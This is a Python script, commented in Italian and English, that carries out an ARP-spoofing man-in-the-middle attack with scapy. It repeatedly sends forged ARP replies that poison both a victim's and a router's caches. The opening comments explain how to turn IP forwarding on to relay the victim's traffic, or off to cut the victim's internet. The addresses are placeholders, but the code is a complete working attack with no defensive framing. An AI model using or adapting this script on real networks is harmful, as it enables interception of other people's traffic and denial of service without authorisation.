#  Avvia lo script
#      sudo python3 arp_spoofing.py
#  in questo momento l'internet della vittima è disabilitato, per abilitarlo dopo aver lancato lo scritp  APRI UN ALTRO TERMINALE e lancia
#      sudo iptables -P FORWARD ACCEPT
#      sudo sysctl -w net.ipv4.ip_forward=1 
#  se vuoi disattivare l'internet alla vittima lancia
#      sudo sysctl -w net.ipv4.ip_forward=0

from scapy.all import ARP, send
import time

# Function to send ARP spoofing packets to the victim
def vittima_spoof(victim_ip, victim_mac, fake_mac, fake_ip):
    # Create a forged ARP reply packet
    arp_reply = ARP()
    arp_reply.op = 2  # Operation type 2 means 'ARP reply' (is-at)
    arp_reply.pdst = victim_ip       # Target IP (the victim's IP address)
    arp_reply.hwdst = victim_mac     # Target MAC (the victim's MAC address)
    arp_reply.hwsrc = fake_mac       # Source MAC (attacker's MAC, pretending to be the router)
    arp_reply.psrc = fake_ip         # Source IP (spoofed IP, the router's IP)
    # Send the packet to the victim (silent mode)
    send(arp_reply, verbose=False)

# Function to send ARP spoofing packets to the router
def router_spoof(router_ip, router_mac, fake_mac, fake_ip):
    # Create a forged ARP reply packet
    arp_reply = ARP()
    arp_reply.op = 2  # Operation type 2 means 'ARP reply'
    arp_reply.pdst = router_ip       # Target IP (the router's IP address)
    arp_reply.hwdst = router_mac     # Target MAC (the router's MAC address)
    arp_reply.hwsrc = fake_mac       # Source MAC (attacker's MAC, pretending to be the victim)
    arp_reply.psrc = fake_ip         # Source IP (spoofed IP, the victim's IP)
    # Send the packet to the router (silent mode)
    send(arp_reply, verbose=False)

# Check if the script is being executed directly (not imported as a module)
if __name__ == "__main__":
    # Usa indirizzi riservati per esempi (RFC 5737)
    victim_ip    = "192.0.2.129"            # esempio (TEST-NET-1)
    victim_mac   = "AA:BB:CC:DD:EE:01"      # MAC di esempio
    router_ip    = "198.51.100.1"           # esempio (TEST-NET-2)
    router_mac   = "AA:BB:CC:DD:EE:02"      # MAC di esempio
    attacker_mac = "AA:BB:CC:DD:EE:03"      # MAC di esempio

    try:
        # Infinite loop to continuously send ARP spoof packets
        while True:
            # Spoof the victim to believe the attacker is the router
            vittima_spoof(victim_ip, victim_mac, attacker_mac, router_ip)
            # Spoof the router to believe the attacker is the victim
            router_spoof(router_ip, router_mac, attacker_mac, victim_ip)
            # Wait for 2 seconds before sending the next set of spoofed packets
            time.sleep(2)
    except KeyboardInterrupt:
        # Graceful exit when the user presses Ctrl+C
        print("Exiting the script")
